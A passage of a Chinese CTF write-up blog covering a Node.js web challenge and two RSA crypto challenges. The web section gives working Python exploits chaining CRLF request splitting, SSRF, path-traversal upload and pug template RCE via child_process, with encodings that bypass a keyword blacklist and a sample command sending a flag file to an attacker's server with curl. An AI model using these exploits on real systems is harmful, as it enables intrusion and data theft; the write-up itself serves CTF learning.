)&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//SSRF</span></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>分析代码得知几个路由的用处：</p>
<blockquote>
<p>1、 /：会包含/template目录下的一个pug模板文件来用pub进行渲染；</p>
<p>2、/source：回显源码；</p>
<p>3、/file_upload：限制了只能由IP为<code>127.0.0.1</code>进行文件上传，并且我们可以通过控制MIME进行目录穿越，从而将文件上传到任意目录；</p>
<p>4、/core：通过<code>q</code>向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。</p>
</blockquote>
<p>但是<code>/core</code>路由下不能直接SSRF，而是需要利用<code>Node js</code>的编码安全问题（参考<a href="https://xz.aliyun.com/t/2894">这里</a>），对编码精心构造进行<code>CRLF注入</code>从而来进行SSRF，那么解题思路就明确了：</p>
<ul>
<li>1、利用CRLF注入进行SSRF</li>
<li>2、利用SSRF伪造本地IP进行文件上传</li>
<li>3、上传包含命令执行代码的pug文件到<code>/template</code>目录</li>
<li>4、利用<code>action</code>参数包含文件，执行命令</li>
</ul>
<h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><p>参考上面文章可知，我们可以构造为<code>\u010D\u010A</code>来替换换行<code>\r\n（%0D%0A）</code>，其他的一些特殊字符也如此构造，如<code>空格(%20)</code>构造编码为<code>\u0120</code>，<code>+(%2B)</code>构造编码构造为<code>\u012B</code>…</p>
<p>根据这个方式，构造拆分请求从而进行SSRF，参考网上师傅的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""" HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="ggb0n.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.format(len(body), body) \</span><br><span class="line">    .replace(<span class="string">'+'</span>, <span class="string">'\u012b'</span>)             \</span><br><span class="line">    .replace(<span class="string">' '</span>, <span class="string">'\u0120'</span>)             \</span><br><span class="line">    .replace(<span class="string">'\r\n'</span>, <span class="string">'\u010d\u010a'</span>)    \</span><br><span class="line">    .replace(<span class="string">'"'</span>, <span class="string">'\u0122'</span>)             \</span><br><span class="line">    .replace(<span class="string">"'"</span>, <span class="string">'\u0a27'</span>)             \</span><br><span class="line">    .replace(<span class="string">'['</span>, <span class="string">'\u015b'</span>)             \</span><br><span class="line">    .replace(<span class="string">']'</span>, <span class="string">'\u015d'</span>) \</span><br><span class="line">    + <span class="string">'GET'</span> + <span class="string">'\u0120'</span> + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q='</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n'</span>).text)</span><br></pre></td></tr></table></figure>

<p>出题师傅的exp具有更高的灵活性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl vps-ip:port -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure>

<p>同志仍需努力啊！</p>
<p>参考：<br><a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a><br><a href="https://blog.5am3.com/2020/02/11/ctf-node1/#自己出的-node-game">https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a></p>
<h2 id="Crypto-Easy-RSA"><a href="#Crypto-Easy-RSA" class="headerlink" title="Crypto-Easy_RSA"></a>Crypto-Easy_RSA</h2><p>考察共模攻击</p>
<h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><p>给的附件内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br></pre></td></tr></table></figure>

<p>这就很明显了，对相同的明文，利用相同的模数<code>n</code>，不同的<code>e</code>进行加密，显然的共模攻击。<br>直接上脚本了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)个字符</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure>

<p>关于RSA攻击的一些常见题目，可以参考<a href="https://xz.aliyun.com/t/6459">这里</a>。</p>
<h2 id="Crypto-warm-up"><a href="#Crypto-warm-up" class="headerlink" title="Crypto-warm_up"></a>Crypto-warm_up</h2><p>一道RSA攻击题，比赛的时候用了很久的时间，结果方法是那个方法，也没毛病，但是拿到的中间解密结果就是跟正确的不一样…<br>【补充】后来得知是利用<a href="https://blog.csdn.net/jcbx_/article/details/101066670">Rabin算法</a>来解密，</p>
<h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先拿到加密的脚本：<br><code>challenge</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encode <span class="keyword">import</span> KEY</span><br><span class="line"></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s=getPrime(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">e1=<span class="number">125794</span></span><br><span class="line">e2=<span class="number">42373</span></span><br><span class="line"></span><br><span class="line">n1=p*q</span><br><span class="line"><span class="comment"># p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599</span></span><br><span class="line"><span class="comment"># q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279</span></span><br><span class="line">n2=p*r</span><br><span class="line"><span class="comment"># r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829</span></span><br><span class="line">n3=p*q*s</span><br><span class="line"><span class="comment"># s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546</span></span><br><span class="line">c1=pow(s,e1,n1)</span><br><span class="line">Key=int(KEY.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">key_encode=pow(Key,e2,n3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"enc"</span>,<span class="string">"a"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"c1: "</span>+str(c1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n1: "</span>+str(n1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n2: "</span>+str(n2)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"key_encode: "</span>+str(key_encode)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>

<p><code>encode</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(len(flag))</span><br><span class="line"></span><br><span class="line">dec=int(flag.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(bin(dec)[<span class="number">2</span>:])==<span class="number">335</span></span><br><span class="line">mask=int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec=(dec^dec&lt;&lt;<span class="number">200</span> )&amp;mask</span><br><span class="line">enc=dec^bytes_to_long(KEY)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"enc: "</span>+str(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br></pre></td></tr></table></figure>

<p>审计代码可知，要拿到flag，我们首先需要拿到<code>KEY</code>，而<code>KEY</code>是经过RSA加密的。<br>但是观察RSA代码发现<code>n1</code>和<code>n2</code>有公约数<code>p</code>，利用欧几里何算法即可求得：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:         <span class="comment">#考虑特殊情况</span></span><br><span class="line">        print(<span class="string">"n is not equal 0!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> m%n!=<span class="number">0</span>:</span><br><span class="line">            new=m</span><br><span class="line">            m=n</span><br><span class="line">            n=new%n</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure>

<p>这样我们就有了<code>p</code>、<code>q</code>、<code>r</code>，但是要得到<code>KEY</code>，我们需要拿到<code>s</code>，这个地方参考了网上的<a href="https://www.anquanke.com/post/id/164575#h2-4">一篇文章</a>中的一部分来求，但是求得的<code>s</code>不是<code>1500</code>bit、但是加密的密文却是一样的…然后也就没有做下去了，等WP吧…<br>后来一位师傅分享了自己的总结，学习下吧：<br><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a><br>师傅给了他的脚本做参考，但是还没完全搞明白，等WP出来研究好了再补充。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>利用<code>Rabin</code>算法解密RSA部分，然后利用运算的特性将<code>dec=(dec^dec&lt;&lt;200)&amp;mask</code>通过<code>dec=(dec^dec&gt;&gt;200)&amp;mask</code>进行还原，解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span 